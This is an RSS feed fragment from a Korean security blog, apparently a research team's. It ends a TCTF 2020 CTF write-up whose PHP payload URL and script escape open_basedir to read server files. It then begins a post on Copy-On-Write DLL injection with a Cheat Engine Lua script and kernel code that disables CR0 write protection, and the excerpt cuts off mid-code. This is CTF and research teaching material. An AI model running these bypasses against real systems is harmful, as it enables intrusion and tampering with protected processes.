class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;373102940643&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ef0b8ab909ff4d486c5f584d7c86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;payload : &lt;a href=&quot;http://pwnable.org:47780/?action=upload&amp;amp;data%5B%5D=%3C?php%20error_reporting(E_ALL);%20ini_set(%22display_errors%22,%201);%20file_get_contents(%27../../index.php%27)%20?%3E&quot;&gt;http://pwnable.org:47780/?action=upload&amp;amp;data[]=&amp;lt;?php error_reporting(E_ALL); ini_set(â€œdisplay_errorsâ€, 1); file_get_contents(â€˜../../index.phpâ€™) ?&amp;gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ì´ë¥¼ ìš°íšŒí•˜ëŠ” ë°©ë²•ì€ 2ê°€ì§€ê°€ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;subdirectory&lt;/li&gt;
  &lt;li&gt;symbolic link&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ë³¸ ë¬¸ì œì—ì„œëŠ” subdirectoryë¥¼ ì´ìš©í•˜ì—¬ open_basedir ì„¤ì •ì„ ìš°íšŒí•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;error_reporting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;E_ALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;ini_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;display_errors&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$base_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/var/www/html/sandbox/373102940643ef0b8ab909ff4d486c5f584d7c86/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$base_dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$base_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/choiys'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;chdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$base_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/choiys'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;nb&quot;&gt;ini_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'open_basedir'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'..'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;chdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'../'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;chdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'../'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;chdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'../'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;chdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'../'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;chdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'../'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;chdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'../'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;ini_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'open_basedir'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$dirs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;scandir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dirs&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;//    echo file_get_contents('/var/www/html/function.php');&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;bypass open_basedir&lt;/strong&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;open_basedirì´ ì„¤ì •ë˜ì–´ìˆëŠ” ìƒíƒœì—ì„œ ì„ì˜ì˜ ë””ë ‰í† ë¦¬ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.&lt;/li&gt;
  &lt;li&gt;chdir ëª…ë ¹ì–´ë¥¼ í†µí•´ í•´ë‹¹ ë””ë ‰í† ë¦¬ë¡œ ì´ë™í•œ í›„ open_basedirì„ ìƒìœ„ ë””ë ‰í† ë¦¬ë¡œ ë³€ê²½í•©ë‹ˆë‹¤.&lt;/li&gt;
  &lt;li&gt;chdir ëª…ë ¹ì–´ë¥¼ ë°˜ë³µ ì‚¬ìš©í•˜ì—¬ ë£¨íŠ¸ ë””ë ‰í† ë¦¬ë¡œ ì´ë™í•©ë‹ˆë‹¤.&lt;/li&gt;
  &lt;li&gt;open_basedirì„ ë£¨íŠ¸ ë””ë ‰í† ë¦¬(/)ë¡œ ë³€ê²½í•©ë‹ˆë‹¤.&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;p&gt;ìœ„ì™€ ê°™ì€ í”„ë¡œì„¸ìŠ¤ë¥¼ í†µí•´ ê³ ì •ëœ open_basedirì„ ë£¨íŠ¸ ë””ë ‰í† ë¦¬ë¡œ ë³€ê²½í•  ìˆ˜ ìˆìœ¼ë©°, ê²°ê³¼ì ìœ¼ë¡œ ëª¨ë“  ë””ë ‰í† ë¦¬ì— ì ‘ê·¼ì´ ê°€ëŠ¥í•´ì§‘ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì´í›„ scandir í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ë£¨íŠ¸ ë””ë ‰í† ë¦¬ë¥¼ í™•ì¸í•˜ì—¬ flag íŒŒì¼ì´ ì¡´ì¬í•˜ëŠ” ê²ƒì„ í™•ì¸í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;âœ  cloud_computing &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;agent  agent.i64  golang_loader_assist.py  legacy_flag  payload.py  res.out
âœ  cloud_computing file res.out
res.out: &lt;span class=&quot;nb&quot;&gt;gzip &lt;/span&gt;compressed data, was &lt;span class=&quot;s2&quot;&gt;&quot;flag.img&quot;&lt;/span&gt;, last modified: Fri Jun 26 00:54:32 2020, from Unix, original size modulo 2^32 1048064
âœ  cloud_computing &lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;res.out res.gz
âœ  cloud_computing &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; res.gz
âœ  cloud_computing file res
res: Linux rev 1.0 ext2 filesystem data &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mounted or unclean&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;UUID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;d4d08581-e309-4c51-990b-6472ba249420 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;large files&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì¶”ì¶œí•œ íŒŒì¼ì„ í™•ì¸í•´ë³´ë©´ gzipìœ¼ë¡œ ì••ì¶•ë˜ì–´ìˆìœ¼ë©°, ì••ì¶• í•´ì œ ì‹œ ext2 ì´ë¯¸ì§€ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/choi61.png&quot; alt=&quot;/assets/choi61.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;í•´ë‹¹ ì´ë¯¸ì§€ë¥¼ hexì—ë””í„°ë¡œ ì‚´í´ë³´ë©´ PNGíŒŒì¼ì´ ì¡´ì¬í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©°, ì¹´ë¹™í•˜ì—¬ ì´ë¯¸ì§€ë¥¼ ì¶”ì¶œí•˜ë©´ í”Œë˜ê·¸ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/choi62.png&quot; alt=&quot;/assets/choi62.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;FLAG : &lt;strong&gt;flag{do_u_like_cloud_computing}&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 01 Jun 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-06-01/TCTF-2020-Cloud-Computing</link>
        <guid isPermaLink="true">http://localhost:4000/2020-06-01/TCTF-2020-Cloud-Computing</guid>
        
        <category>ctf</category>
        
        <category>misc</category>
        
        <category>php</category>
        
        
      </item>
    
      <item>
        <title>Copy-On-Write í˜ì´ì§€ ì¡°ì‘ì„ ì´ìš©í•œ Global Dll injection</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ê¹€ì¬ì„±&lt;/p&gt;

&lt;h1 id=&quot;1-ê°œìš”&quot;&gt;1. ê°œìš”&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;ìµœê·¼ì— Windows í”„ë¡œì„¸ìŠ¤ ë©”ëª¨ë¦¬ë¥¼ ë³´í˜¸í•˜ëŠ” ê¸°ë²•ì„ ì°¾ì•„ë³´ë‹¤ê°€ í¥ë¯¸ë¡œìš´ ê¸€ì„ ë³¸ì ì´ ìˆì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;undocumentedì¸ &lt;code class=&quot;highlighter-rouge&quot;&gt;SEC_NO_CHANGE&lt;/code&gt; ì˜µì…˜ìœ¼ë¡œ ì„¹ì…˜ì„ ìƒì„±í•˜ê³  ë©”ëª¨ë¦¬ë¥¼ Mapping í•˜ë©´ ì´í›„ í˜ì´ì§€ ì†ì„±ì´ ë³€ê²½ë˜ëŠ” ê²ƒì„ ìœ ì €ë ˆë²¨ì—ì„œë„ ë³´í˜¸í•  ìˆ˜ ìˆë‹¤ëŠ”ê±´ë°, ì´ë¯¸ ì¼ë¶€ ë³´ì•ˆ í”„ë¡œê·¸ë¨ì—ì„œë„ ì‚¬ìš© ì¤‘ì¸ ê¸°ë²•ì´ì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì‹¤ì œë¡œ ìê¸°ìì‹ ì˜ ë©”ëª¨ë¦¬ë¥¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;SEC_NO_CHANGE&lt;/code&gt; ì˜µì…˜ìœ¼ë¡œ Remappingí•´ì£¼ëŠ” ì˜ˆì œ(&lt;a href=&quot;https://github.com/changeofpace/Self-Remapping-Code&quot;&gt;https://github.com/changeofpace/Self-Remapping-Code&lt;/a&gt;)ë¥¼ í…ŒìŠ¤íŠ¸í•´ë³´ë©´ VirtualProtect í•¨ìˆ˜ê°€ ì‹¤íŒ¨í•˜ê³  ë‚´ë¶€ì ìœ¼ë¡œ í˜ì´ì§€ ë³´í˜¸ì†ì„±ì„ ë³€ê²½í•˜ëŠ” WriteProessMemory í•¨ìˆ˜ ì—­ì‹œ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë³´í˜¸ëœ ë©”ëª¨ë¦¬ë¥¼ Unmap, Freeí•˜ê³  ìƒˆë¡œ í• ë‹¹í•˜ëŠ” ë°©ë²• ì´ì™¸ì—ëŠ” ìš°íšŒí•  ë°©ë²•ì´ ì—†ì–´ë³´ì˜€ëŠ”ë° Cheat Engineì˜ íŠ¹ì • ê¸°ëŠ¥ì„ í™œì„±í™”í•´ì„œ ìš°íšŒ ê°€ëŠ¥í•œê²ƒì„ í™•ì¸í–ˆê³  ì¡°ê¸ˆ ë” ì‘ìš©í•˜ì—¬ Copy-On-Write í˜ì´ì§€ ì¡°ì‘ì„ í†µí•œ Global Dll injectionê¹Œì§€ ê°€ëŠ¥í•´ë³´ì—¬ ì´ë¥¼ ì‹œë„í•´ë³´ì•˜ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;2-ë©”ëª¨ë¦¬-ë³´í˜¸-ìš°íšŒì™€-copy-on-write&quot;&gt;2. ë©”ëª¨ë¦¬ ë³´í˜¸ ìš°íšŒì™€ Copy-On-Write&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/bad60.png&quot; alt=&quot;/assets/bad60.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cheat Engineì˜ &lt;code class=&quot;highlighter-rouge&quot;&gt;Query memory region routine&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;Read/Write Process Memory&lt;/code&gt; ìœ„ ë‘ ì˜µì…˜ì„ í™œì„±í™”í•˜ë©´ ì»¤ë„ ë“œë¼ì´ë²„ë¥¼ ì´ìš©í•œ ë©”ëª¨ë¦¬ ì½ê¸°/ì“°ê¸°ë¥¼ ì§€ì›í•˜ëŠ”ë°, í•´ë‹¹ ì˜µì…˜ë“¤ì€ ë³´í˜¸ëœ ì½ê¸°ì „ìš© í˜ì´ì§€ì—ëŠ” ì—¬ì „íˆ ì“°ê¸°ê°€ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤.  í˜ì´ì§€ ë³´í˜¸ ì†ì„±ì„ ë¬´ì‹œí•˜ê³  ì“°ê¸° ì‘ì—…ì„ ì§„í–‰í•˜ê¸° ìœ„í•´ì„œëŠ” ì•„ë˜ ì‘ì—…ì„ ì¶”ê°€ë¡œ ì§„í–‰í•´ì•¼í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-lua highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;dbk_initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;dbk_useKernelmodeOpenProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;dbk_useKernelmodeProcessMemoryAccess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;dbk_writesIgnoreWriteProtection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Memory Viewerì—ì„œ Ctrl+Lì„ ëˆ„ë¥´ë©´ Lua scriptë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ”ë° ìœ„ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ë©´ ì´í›„ì—ëŠ” ë³´í˜¸ëœ ë©”ëª¨ë¦¬ë¥¼ ê°•ì œë¡œ ì“¸ ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;BOOLEAN&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;WriteProcessMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PEPROCESS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PEProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;KeAttachProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PEPROCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;selectedprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;kr&quot;&gt;__try&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsAddressSafe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UINT_PTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsAddressSafe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UINT_PTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disabledWP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

				&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loadedbydbvm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KernelWritesIgnoreWP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;disableInterrupts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

					&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loadedbydbvm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
						&lt;span class=&quot;n&quot;&gt;vmx_disable_dataPageFaults&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

					&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KernelWritesIgnoreWP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
					&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
						&lt;span class=&quot;n&quot;&gt;DbgPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Disabling CR0.WP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
						&lt;span class=&quot;n&quot;&gt;setCR0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getCR0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//disable the WP bit					&lt;/span&gt;
						&lt;span class=&quot;n&quot;&gt;disabledWP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
					&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loadedbydbvm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UINT_PTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8000000000000000ULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;RtlCopyMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
